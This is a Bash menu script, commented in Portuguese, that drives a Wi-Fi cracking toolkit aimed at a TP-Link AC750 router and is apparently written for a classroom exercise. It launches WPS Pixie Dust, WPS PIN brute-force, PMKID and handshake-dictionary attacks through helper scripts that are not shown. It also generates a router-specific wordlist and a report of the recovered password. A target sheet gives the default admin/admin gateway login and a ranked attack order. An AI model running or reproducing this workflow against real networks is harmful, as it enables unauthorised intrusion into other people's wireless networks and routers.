#!/usr/bin/env bash
#
# wifi_audit.sh - Menu central do sistema de auditoria Wi-Fi (Kali Linux).
#
# Amarra as duas ferramentas num fluxo unico:
#   - reconhecimento (wifi_recon.py)
#   - ataques (wifi_crack.sh): WPS Pixie Dust, handshake+dicionario, PMKID
#
# Pre-configurado para o alvo da atividade: TP-Link AC750 (Archer C20).
# A ordem sugerida abaixo vai do ataque mais rapido para o mais lento.
#
# USO ACADEMICO / AUTORIZADO apenas - equipamento liberado pelo professor.
#
set -euo pipefail
cd "$(dirname "$0")"

R="\033[31m"; G="\033[32m"; Y="\033[33m"; B="\033[34m"; C="\033[36m"; N="\033[0m"

banner() {
cat <<EOF
${C}============================================================${N}
         SISTEMA DE AUDITORIA WI-FI  -  uso academico
         Alvo da atividade: TP-Link AC750 (Archer C20)
${C}============================================================${N}
EOF
}

ficha_tplink() {
cat <<EOF
${Y}Ficha do alvo - TP-Link AC750 / Archer C20${N}
  - Dual band: 2.4 GHz (canais 1-13) e 5 GHz (canais 36+)
  - Criptografia padrao : WPA/WPA2-PSK (AES/CCMP)
  - Gateway padrao      : 192.168.0.1   (login admin / admin)
  - SSID de fabrica     : TP-Link_XXXX
  - WPS                 : historicamente ATIVO e vulneravel a Pixie Dust
                          (apenas na banda 2.4 GHz)

${Y}Ordem de ataque recomendada (mais rapido -> mais lento):${N}
  1) WPS Pixie Dust  - segundos a minutos, se o WPS estiver ativo/destravado
  2) PMKID           - rapido, nao precisa de cliente conectado
  3) Handshake+dict  - depende de cliente e de a senha estar na wordlist
EOF
}

IFACE="${IFACE:-wlan0}"

menu() {
    clear 2>/dev/null || true
    banner
    echo -e "Interface atual: ${G}${IFACE}${N}  (opcao 5 para trocar)\n"
    echo "  1) Reconhecimento  - extrair SSID/BSSID/canal/frequencia/cripto"
    echo "  2) Ataque WPS (Pixie Dust)          [recomendado p/ TP-Link]"
    echo "  3) Ataque WPS Bruteforce do PIN     (fallback do Pixie Dust)"
    echo "  4) Ataque PMKID (sem cliente)"
    echo "  5) Ataque Handshake + dicionario"
    echo "  6) Gerar wordlist direcionada a TP-Link"
    echo "  7) Gerar relatorio (.md + .html)"
    echo "  8) Abrir painel web (webui.py)"
    echo "  9) Trocar interface wireless (atual: $IFACE)"
    echo "  i) Ficha do alvo (TP-Link AC750)"
    echo "  0) Sair"
    echo
    read -rp "Escolha: " op
    case "$op" in
        1) python3 wifi_recon.py --json dados.json; pausa ;;
        2) sudo ./wifi_crack.sh -i "$IFACE" -m wps; pausa ;;
        3) sudo ./wifi_crack.sh -i "$IFACE" -m wps-bf; pausa ;;
        4) sudo ./wifi_crack.sh -i "$IFACE" -m pmkid; pausa ;;
        5) sudo ./wifi_crack.sh -i "$IFACE" -m handshake; pausa ;;
        6) python3 gerar_wordlist_tplink.py -o tplink.txt --datas; pausa ;;
        7) read -rp "Seu nome: " a; read -rp "Senha recuperada: " s
           read -rp "Metodo (wps/wps-bf/pmkid/handshake): " me
           python3 gerar_relatorio.py --json dados.json --autor "$a" \
                   --senha "$s" --metodo "$me" --saida relatorio.md --html relatorio.html
           pausa ;;
        8) command -v python3 >/dev/null && { echo "Abra http://127.0.0.1:8000"; python3 webui.py; } ; pausa ;;
        9) read -rp "Nova interface: " IFACE ;;
        i|I) clear 2>/dev/null || true; ficha_tplink; pausa ;;
        0) exit 0 ;;
        *) echo "Opcao invalida." ; sleep 1 ;;
    esac
}

pausa() { echo; read -rp "Enter para voltar ao menu..." _; }

command -v python3 >/dev/null || { echo -e "${R}python3 nao encontrado.${N}"; exit 1; }
[ -f wifi_crack.sh ] || { echo -e "${R}wifi_crack.sh nao encontrado nesta pasta.${N}"; exit 1; }
chmod +x wifi_crack.sh wifi_recon.py 2>/dev/null || true

banner
ficha_tplink
echo
read -rp "Enter para abrir o menu..." _
while true; do menu; done
